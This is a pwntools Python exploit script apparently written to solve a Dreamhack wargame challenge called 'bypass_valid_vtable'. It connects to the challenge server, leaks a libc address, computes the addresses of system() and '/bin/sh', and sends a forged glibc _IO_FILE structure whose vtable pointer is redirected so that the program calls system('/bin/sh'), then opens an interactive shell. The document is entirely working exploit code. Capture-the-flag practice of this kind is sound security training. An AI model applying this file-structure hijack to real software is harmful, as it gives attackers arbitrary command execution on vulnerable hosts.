from pwn import *

REMOTE = True

if not REMOTE:
    r = process('/home/bypass_valid_vtable/bypass_valid_vtable')
    stdout_offset = 0x3ec760
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
    vtable_offset = 0x3e82a0
else:
    r = remote('host1.dreamhack.games', 10755)
    stdout_offset = 0x3ec760
    system_offset = 0x4f440
    binsh_offset = 0x1b3e9a
    vtable_offset = 0x3e82a0

bss = 0x601080  # empty bss buffer


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"
vtable = libc + vtable_offset  # _IO_file_jumps


# overwrite _IO_FILE structure

payload = p64(0xfbad0000)  # _flags
payload += p64(0)  # _IO_read_ptr
payload += p64(0)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(0)  # _IO_write_base
payload += p64(binsh)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(0)  # _IO_buf_base
payload += p64(int((binsh - 100) / 2))  # _IO_buf_end
payload += p64(0) * 5
payload += p32(3)  # _fileno
payload += p32(0)  # _flags2
payload += p64(0) * 2
payload += p64(bss)  # _lock
payload += p64(0) * 9
payload += p64(vtable + 0xc8)
payload += p64(system)

r.sendafter('Data: ', payload)


r.interactive()